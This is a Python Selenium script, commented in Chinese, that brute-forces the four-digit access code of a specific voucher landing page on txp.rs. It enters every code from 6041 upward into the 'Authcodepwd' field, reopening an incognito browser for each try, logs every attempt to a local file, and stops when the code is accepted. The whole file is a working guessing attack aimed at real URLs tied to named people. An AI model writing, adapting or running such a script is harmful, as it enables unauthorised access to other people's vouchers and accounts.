# 載入需要的套件
from selenium import webdriver
from selenium.webdriver.support import ui
from selenium.common.exceptions import NoSuchElementException
from Member import Member


class GetCake:
    MAIN_PAGE = 'https://txp.rs/v/A0nRiJ1aW47/EDENREDLANDING?desktop=true'  # SihRong 6122
    # MAIN_PAGE = 'https://txp.rs/v/A28tDbHhvr8/EDENREDLANDING?desktop=true'  # Allen 7825

    def __init__(self, member: Member):
        # 人員物件
        self.member = member

    def runSign(self):

        init = 6041
        max = 9999

        # init = 7824
        # max = 8000

        while init <= max:
            # 初始化新瀏覽器
            self.__reInit()

            # 打開蛋糕網頁
            self.__openMainPage()

            # 檢查密碼是否正確
            checkFlag = self.__checkPasswordCorrect(init)

            # 關閉瀏覽器
            self.__closeBrowser()

            # 將結果寫入文字文件
            fs = open('/Users/allenchen/cakePassword.txt', 'a')
            fs.write(str(init) + ':' + str(checkFlag) + "\n")
            fs.close()

            # 迴圈控制變數 + 1
            init += 1

            # 如果找到就跳出迴圈
            if (checkFlag):
                break

    def __reInit(self):
        # 瀏覽器參數
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--incognito")

        # 開啟瀏覽器視窗(Chrome)
        self.driver = webdriver.Chrome(chrome_options=chrome_options)

        # 等待網頁回應
        self.wait = ui.WebDriverWait(self.driver, 10)

    def __openMainPage(self):
        # 前往蛋糕系統
        self.driver.get(self.MAIN_PAGE)

    def __checkPasswordCorrect(self, password):
        # 輸入密碼
        elementPassword = self.driver.find_element_by_id('Authcodepwd')
        elementPassword.send_keys(password)
        try:
            self.driver.find_element_by_id(
                'Authcodepwd'
            )
        except NoSuchElementException:
            return True

        return False

    def __closeBrowser(self):
        # 關閉瀏覽器視窗
        self.driver.close()
